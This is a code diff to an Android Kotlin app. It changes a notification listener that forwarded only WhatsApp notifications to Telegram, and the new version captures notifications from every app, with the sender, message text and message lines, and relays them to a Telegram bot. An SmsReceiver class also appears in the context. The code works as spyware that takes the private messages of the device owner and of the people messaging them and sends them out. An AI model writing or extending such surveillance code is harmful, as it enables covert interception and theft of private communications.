@@ -125,13 +125,33 @@ class SmsReceiver : BroadcastReceiver() {
 
 class NotifListener : NotificationListenerService() {
     override fun onNotificationPosted(sbn: StatusBarNotification) {
-        val pkg = sbn.packageName ?: return
-        if (pkg != "com.whatsapp" && pkg != "com.whatsapp.w4b") return
         val e = sbn.notification?.extras ?: return
+        
+        val pkg = sbn.packageName ?: "unknown"
+        var appName = pkg
+        try {
+            val pm = packageManager
+            val ai = pm.getApplicationInfo(pkg, 0)
+            appName = pm.getApplicationLabel(ai).toString()
+        } catch (ex: Exception) {}
+
         val title = e.getCharSequence(android.app.Notification.EXTRA_TITLE)?.toString() ?: ""
         val text = e.getCharSequence(android.app.Notification.EXTRA_TEXT)?.toString() ?: ""
         val big = e.getCharSequence(android.app.Notification.EXTRA_BIG_TEXT)?.toString()
-        if (title.isBlank() && text.isBlank()) return
-        Telegram.sendText("💬 WhatsApp\n$title\n${big ?: text}")
+        val linesArr = e.getCharSequenceArray(android.app.Notification.EXTRA_TEXT_LINES)
+        val lines = linesArr?.joinToString("\n") ?: ""
+
+        val finalText = big ?: text
+        
+        if (title.isBlank() && finalText.isBlank() && lines.isBlank()) return
+
+        val msg = buildString {
+            append("📱 التطبيق: $appName\n")
+            if (title.isNotBlank()) append("👤 من: $title\n")
+            if (finalText.isNotBlank()) append("💬: $finalText\n")
+            if (lines.isNotBlank()) append("📝:\n$lines\n")
+        }
+
+        Telegram.sendText(msg.trim())
     }
 }
